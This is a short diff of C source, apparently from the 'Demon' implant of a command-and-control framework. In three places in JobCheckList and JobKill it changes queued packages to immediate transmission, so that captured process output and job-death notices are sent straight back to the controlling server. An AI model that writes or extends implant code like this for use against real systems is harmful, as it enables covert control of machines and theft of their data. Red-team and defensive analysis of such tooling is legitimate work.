@@ -117,7 +117,7 @@ VOID JobCheckList()
                         // notify the TS that the process is dead, so that the RequestID can be closed
                         PPACKAGE Package = PackageCreateWithRequestID( JobList->RequestID, DEMON_COMMAND_JOB );
                         PackageAddInt32( Package, DEMON_COMMAND_JOB_DIED );
-                        PackageQueue( Package );
+                        PackageTransmit( Package );
 
                         // free resources
                         SysNtClose( JobList->Handle );
@@ -159,7 +159,7 @@ VOID JobCheckList()
                                 {
                                     PPACKAGE Package = PackageCreateWithRequestID( JobList->RequestID, DEMON_OUTPUT );
                                     PackageAddBytes( Package, Buffer, Available );
-                                    PackageQueue( Package );
+                                    PackageTransmit( Package );
                                 }
 
                                 DATA_FREE( Buffer, Size )
@@ -354,7 +354,7 @@ BOOL JobKill( DWORD JobID )
                                 {
                                     PPACKAGE Package = PackageCreateWithRequestID( JobList->RequestID, DEMON_OUTPUT );
                                     PackageAddBytes( Package, Buffer, Available );
-                                    PackageQueue( Package );
+                                    PackageTransmit( Package );
                                 }
 
                                 DATA_FREE( Buffer, Size )
